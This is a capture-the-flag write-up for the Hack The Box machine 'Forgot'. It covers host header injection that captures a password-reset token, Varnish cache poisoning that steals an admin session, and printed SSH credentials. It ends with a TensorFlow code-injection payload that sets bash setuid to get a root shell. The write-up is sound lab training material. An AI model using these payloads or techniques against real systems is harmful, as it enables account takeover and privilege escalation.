Sup, this is write up for the box Forgot from Hackthebox. Let's start with nmap:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:39 EST
Nmap scan report for 10.10.11.188 (10.10.11.188)
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
```

There are two ports open ssh and http. We see that the site is running python. Looking at the error when trying to visit site that surely doesn't
exist we see familiar flask not found page. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Forgot/images/IMG1.png?raw=true)

On the main page is login form. That is not vulnerable to sql injection.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Forgot/images/IMG2.png?raw=true)

Trying different usernames doesn't return different error when trying to log in meaning we can't do username enumeration based on error message.
Looking at the source code there is username: robert-dev-87120 (this one is different for each htb player so people don't collide when playing the box).

We can request password recovery link. With that we can try to get the server to send the reset link to our server with host header injection (for example https://medium.com/@tameemkhalid786/host-header-injection-on-password-reset-functionality-an-easy-p2-5c6263c2e3d4).

Now we start netcat or python server on our machine:

```
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
``` 

After that we catch the request in burp:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Forgot/images/IMG3png?raw=true)

And we get reset link on our python server:

```
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.188 - - [06/Mar/2023 10:07:28] code 404, message File not found
10.10.11.188 - - [06/Mar/2023 10:07:28] "GET /reset?token=HpnpS2AIvUsIX8oF9KouawOmYQfhr9CjGXBjQMCAXEJxZZWFvKHXGL653pam6IKBnJdIpAJC94Hnzaq0cordSQ%3D%3D HTTP/1.1" 404 -
```

Now let's visit the link and change roberts password to whatever we want. Now we are in on the site. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Forgot/images/IMG4.png?raw=true)

In navbar there are four things the last one being disabled. We can either enable it or just visit admin_tickets. But we get access denied. 

If we curl the site with '-I' to see headers we get this:

```
# curl -I http://10.10.11.188/
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Fri, 10 Mar 2023 14:48:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5186
X-Varnish: 196623 196621
Age: 9
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: keep-alive
``` 

There is a Varnish reverse proxy responsible for caching. It doesn't cache the default page as there is Age:0 in headers but `/static` gets cached. 
We can send link through `/escalate` that admins click with /static and should save his cookie so we can view the ssh creds in the ticket.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Forgot/images/IMG5.png?raw=true)

We will wait some time so it doesn't cache our request without the admin cookie. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Forgot/images/IMG6.png?raw=true)

And now we have creds for ssh: `diego:dCb#1!x0%gjq` and we can login:

```
# ssh diego@10.10.11.188                                                                                                                                                                                                            
diego@10.10.11.188's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-132-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 10 Mar 2023 04:09:52 PM UTC

  System load:           0.03
  Usage of /:            65.9% of 8.72GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             220
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.188
  IPv6 address for eth0: dead:beef::250:56ff:feb9:768


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Nov 18 10:51:30 2022 from 10.10.14.40
diego@forgot:~$ 
```

Having password we can start looking for ways to escalate privileges with `sudo -l`:

```
diego@forgot:~$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
```

Don't know much about python so I will just look at different functions to use for privesc.
This one stood out:

```
preprocess_input_exprs_arg_string
```

There is code injection CVE for this https://github.com/advisories/GHSA-75c9-jrh4-79mc
The script checks for XSS and when it detects it it gets passwed to the `preprocess_input_exprs_arg_string` function.

I'll use this payload to make bash setuid which is the easiest way to get root. For some reason it had problem with `+s`

```
hello=exec("""\nimport os\nos.system('chmod 4777 /bin/bash')""");#<script>alert('xss')</script>
```

After that I can just simply run the script with sudo and make bash setuid.

```
iego@forgot:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
diego@forgot:~$ sudo /opt/security/ml_security.py
2023-03-11 23:17:02.168590: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2023-03-11 23:17:02.168625: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
chmod: invalid mode: ‘s’
Try 'chmod --help' for more information.
chmod: invalid mode: ‘s’
Try 'chmod --help' for more information.
chmod: invalid mode: ‘s’
Try 'chmod --help' for more information.
diego@forgot:~$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1183448 Apr 18  2022 /bin/bash
diego@forgot:~$ /bin/bash -p
bash-5.0# id
uid=1000(diego) gid=1000(diego) euid=0(root) groups=1000(diego)
```

It still has the problem with s but we got root shell anyway. This means the end of this box. Thanks for reading u can hit me up on twitter https://twitter.com/Vojtech1337 and until next time.
